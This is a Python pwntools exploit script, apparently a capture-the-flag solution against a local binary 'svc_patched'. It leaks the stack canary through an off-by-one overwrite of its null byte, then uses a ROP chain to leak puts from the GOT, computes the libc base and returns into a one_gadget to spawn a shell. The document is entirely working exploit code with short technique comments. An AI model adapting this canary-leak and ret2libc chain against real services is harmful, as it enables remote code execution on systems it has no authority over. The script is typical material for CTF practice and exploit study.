from pwn import *

p = process(['./svc_patched'])

elf = ELF("./svc_patched",checksec=False)
libc = ELF("./libc-2.23.so",checksec=False)

# context.log_level = 'debug'

# gdb.attach(p, gdbscript="""br *0x400d74
# """)

# puts() -> read until null. So we can fill stack until canary
# read() -> will add '\n' or 0a to end our input. So will overwrite lsb canary, since lsb always null '\x00' so we get all canaries (7 bytes + null)

# init-gef
# canary
# tel
# p/d 0x00007fffffffdc98 - 0x00007fffffffdbf0 = 168

def send(z):
    p.sendlineafter(b">>",b"1")
    p.sendafter(b">>",z)

def get_canary():
    p.sendlineafter(b">>",b"2")
    p.recvuntil(b'A'*169)
    canary = u64(b'\x00' + p.recv(7))
    return canary

offset = b'A'*169

send(offset)
canary = get_canary()

log.success("Leak canary: " + hex(canary))

# Gadget
pop_rdi = 0x0000000000400ea3
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
ret = 0x00000000004008b1
main_ = 0x400a96

# First ROP offset + canary + junk (8) + ret

payload = offset[:-1]
payload += p64(canary)
payload += b'A'*8
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_)

# gdb.attach(p, gdbscript="""br *0x400d74
# """)

send(payload)
p.sendlineafter(b">>",b"3")

p.recvuntil(b"MIENRALS...\n")
leaks = u64(p.recvuntil(b'\n',drop=True).ljust(8,b'\x00'))

libc.address = leaks - libc.symbols['puts']
one_gadget = libc.address + 0x45216

log.success("Libc Base: " + hex(libc.address))

payload = offset[:-1]
payload += p64(canary)
payload += b'A'*8
payload += p64(ret)
payload += p64(one_gadget)

log.success("one_gadget: " + hex(one_gadget))

send(payload)
p.sendlineafter(b">>",b"3")

p.interactive()